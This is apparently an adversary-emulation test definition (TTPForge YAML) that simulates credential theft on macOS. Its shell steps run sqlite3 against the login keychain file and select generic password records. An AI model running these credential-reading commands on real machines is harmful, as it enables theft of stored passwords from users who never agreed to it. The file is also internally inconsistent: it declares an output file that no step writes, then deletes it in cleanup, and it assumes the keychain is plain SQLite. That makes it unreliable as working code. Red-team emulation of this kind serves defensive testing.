---
api_version: 2.0
uuid: e093386a-2221-44da-b73c-6ed174a508a2
name: Keychain Database Direct Access
authors:
- TTPForge
description: |
  Direct database access to macOS keychain SQLite database
mitre:
  tactics:
  - TA0006 Credential Access
  techniques:
  - T1555 Credentials from Password Stores
  subtechniques:
  - 'T1555.001 Credentials from Password Stores: Keychain'
requirements:
  platforms:
  - os: darwin
args:
- name: keychain_path
  description: Path to keychain database
  type: string
  default: ~/Library/Keychains/login.keychain-db
- name: output_file
  description: File to store query results
  type: string
  default: /tmp/keychain_dump.txt
steps:
- name: Verify Keychain Exists
  inline: test -f {{ .Args.keychain_path }}
- name: Query Keychain Database
  inline: sqlite3 {{ .Args.keychain_path }} '.schema' 2>/dev/null | head -20
- name: Extract Keychain Records
  inline: sqlite3 {{ .Args.keychain_path }} 'SELECT * FROM genp LIMIT 5;' 2>/dev/null || echo 'Keychain access restricted'
  cleanup:
    inline: rm -f {{ .Args.output_file }}
tests:
- name: dry_run_test
  dry_run: true
